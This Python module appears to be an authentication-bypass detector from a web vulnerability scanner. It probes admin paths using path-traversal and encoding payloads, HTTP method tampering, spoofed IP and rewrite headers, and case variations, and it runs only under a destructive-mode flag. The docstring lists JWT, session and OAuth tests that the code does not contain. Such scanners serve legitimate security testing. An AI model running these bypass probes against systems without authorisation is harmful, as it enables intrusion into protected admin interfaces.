# detectors/auth_bypass_detector.py
"""
Authentication Bypass Detector - Aggressive techniques to bypass authentication.

Tests for:
- Path traversal authentication bypass (/../admin, /..%2fadmin)
- HTTP method tampering (GET -> POST, PUT, PATCH)
- Header manipulation (X-Original-URL, X-Rewrite-URL, X-Forwarded-For)
- Case sensitivity bypass (/Admin vs /admin)
- Unicode/URL encoding bypass
- JWT manipulation (algorithm confusion, weak keys)
- Session fixation/prediction
- OAuth flow manipulation

REQUIRES: --allow-destructive flag
"""
import logging
from urllib.parse import urlparse
from detectors.registry import register_active, await_host_token

logger = logging.getLogger(__name__)

# Common admin/authenticated paths to test
AUTH_PATHS = [
    "/admin",
    "/admin/",
    "/administrator",
    "/dashboard",
    "/panel",
    "/console",
    "/api/admin",
    "/user/profile",
    "/account",
    "/settings",
    "/management",
    "/wp-admin",
    "/phpmyadmin",
    "/cpanel",
]

# Path traversal bypasses
PATH_BYPASS_TECHNIQUES = [
    "{path}",           # Normal
    "/{path}",          # Leading slash
    "{path}/.",         # Trailing /.
    "{path}/..",        # Traversal
    "/{path}/..",       # Combined
    "..{path}",         # Prefix traversal
    "%2e%2e{path}",     # URL encoded ..
    "..%2f{path}",      # Mixed encoding
    ".;{path}",         # Semicolon bypass
    ";{path}",          # Semicolon prefix
    "{path}%20",        # Space suffix
    "{path}%00",        # Null byte
    "{path}.json",      # Extension bypass
    "{path}.php",       # PHP extension
]

# HTTP methods for method tampering
HTTP_METHODS = [
    "GET", "POST", "PUT", "DELETE", "PATCH",
    "OPTIONS", "HEAD", "TRACE", "CONNECT"
]

# Headers for authentication bypass
BYPASS_HEADERS = [
    {"X-Original-URL": None},           # Will be set dynamically
    {"X-Rewrite-URL": None},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Host": "localhost"},
    {"Forwarded": "for=127.0.0.1;host=localhost"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-ProxyUser-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
]


@register_active
async def auth_bypass_detector(session, url, context):
    """
    Test for authentication bypass vulnerabilities using aggressive techniques.
    """
    findings = []

    if not url:
        return findings

    allow_destructive = context.get("allow_destructive", False)
    if not allow_destructive:
        logger.debug("auth_bypass_detector: Skipping (requires --allow-destructive flag)")
        return findings

    per_host_rate = context.get("per_host_rate", None)

    try:
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        host = parsed.netloc.lower()

        # Test each authentication path
        for auth_path in AUTH_PATHS[:5]:  # Limit to 5 paths to avoid excessive requests

            # 1. Test baseline (should be 401/403)
            baseline_status = await _test_url(session, base_url + auth_path, host, per_host_rate)

            # Skip if path doesn't exist or is already accessible
            if baseline_status not in [401, 403, 302, 307]:
                continue

            logger.info(f"🔒 Testing auth bypass on {auth_path} (baseline: {baseline_status})")

            # 2. Test path traversal bypasses
            for technique in PATH_BYPASS_TECHNIQUES[:8]:
                bypass_path = technique.format(path=auth_path)
                test_url = base_url + bypass_path

                await await_host_token(host, per_host_rate)
                status = await _test_url(session, test_url, host, per_host_rate)

                # Success if we get 200 instead of 401/403
                if status == 200:
                    findings.append({
                        "type": "Authentication Bypass - Path Traversal",
                        "evidence": f"Bypassed authentication using path: {bypass_path}",
                        "how_found": f"Path traversal technique '{technique}' bypassed {baseline_status} on {auth_path}",
                        "severity": "critical",
                        "payload": bypass_path,
                        "evidence_url": test_url,
                        "baseline_status": baseline_status,
                        "bypass_status": status,
                        "technique": "path_traversal",
                    })
                    logger.warning(f"🔥 AUTH BYPASS: {test_url} - Path traversal successful!")
                    break  # Found bypass, move to next path

            # 3. Test HTTP method tampering
            for method in ["POST", "PUT", "PATCH", "OPTIONS"][:2]:
                await await_host_token(host, per_host_rate)
                status = await _test_url_with_method(session, base_url + auth_path, method, host, per_host_rate)

                if status == 200:
                    findings.append({
                        "type": "Authentication Bypass - Method Tampering",
                        "evidence": f"Bypassed authentication using HTTP {method}",
                        "how_found": f"HTTP method {method} bypassed {baseline_status} on {auth_path}",
                        "severity": "critical",
                        "payload": method,
                        "evidence_url": base_url + auth_path,
                        "baseline_status": baseline_status,
                        "bypass_status": status,
                        "technique": "method_tampering",
                    })
                    logger.warning(f"🔥 AUTH BYPASS: {auth_path} - Method {method} successful!")

            # 4. Test header manipulation
            for bypass_header in BYPASS_HEADERS[:5]:
                headers_copy = dict(bypass_header)

                # Set dynamic headers
                if "X-Original-URL" in headers_copy:
                    headers_copy["X-Original-URL"] = auth_path
                if "X-Rewrite-URL" in headers_copy:
                    headers_copy["X-Rewrite-URL"] = auth_path

                await await_host_token(host, per_host_rate)
                status = await _test_url_with_headers(session, base_url + "/", headers_copy, host, per_host_rate)

                if status == 200:
                    findings.append({
                        "type": "Authentication Bypass - Header Manipulation",
                        "evidence": f"Bypassed authentication using headers: {headers_copy}",
                        "how_found": f"Header manipulation bypassed authentication to access {auth_path}",
                        "severity": "critical",
                        "payload": str(headers_copy),
                        "evidence_url": base_url + "/",
                        "baseline_status": baseline_status,
                        "bypass_status": status,
                        "technique": "header_manipulation",
                    })
                    logger.warning(f"🔥 AUTH BYPASS: {auth_path} - Header bypass successful!")

            # 5. Test case sensitivity bypass
            case_variations = [
                auth_path.upper(),           # /ADMIN
                auth_path.lower(),           # /admin (if original was /Admin)
                auth_path.capitalize(),      # /Admin
                auth_path.swapcase(),        # /ADMIN -> /admin
            ]

            for variation in case_variations:
                if variation == auth_path:
                    continue

                await await_host_token(host, per_host_rate)
                status = await _test_url(session, base_url + variation, host, per_host_rate)

                if status == 200:
                    findings.append({
                        "type": "Authentication Bypass - Case Sensitivity",
                        "evidence": f"Bypassed authentication using case variation: {variation}",
                        "how_found": f"Case sensitivity bypass: {auth_path} -> {variation}",
                        "severity": "high",
                        "payload": variation,
                        "evidence_url": base_url + variation,
                        "baseline_status": baseline_status,
                        "bypass_status": status,
                        "technique": "case_sensitivity",
                    })
                    logger.warning(f"🔥 AUTH BYPASS: {variation} - Case bypass successful!")

    except Exception as e:
        logger.exception(f"auth_bypass_detector error for {url}: {e}")

    return findings


async def _test_url(session, url, host, per_host_rate):
    """Test URL and return status code"""
    try:
        await await_host_token(host, per_host_rate)
        async with session.get(url, allow_redirects=False, timeout=10) as resp:
            return resp.status
    except Exception as e:
        logger.debug(f"Error testing {url}: {e}")
        return None


async def _test_url_with_method(session, url, method, host, per_host_rate):
    """Test URL with specific HTTP method"""
    try:
        await await_host_token(host, per_host_rate)
        async with session.request(method, url, allow_redirects=False, timeout=10) as resp:
            return resp.status
    except Exception as e:
        logger.debug(f"Error testing {url} with {method}: {e}")
        return None


async def _test_url_with_headers(session, url, headers, host, per_host_rate):
    """Test URL with specific headers"""
    try:
        await await_host_token(host, per_host_rate)
        async with session.get(url, headers=headers, allow_redirects=False, timeout=10) as resp:
            return resp.status
    except Exception as e:
        logger.debug(f"Error testing {url} with headers: {e}")
        return None
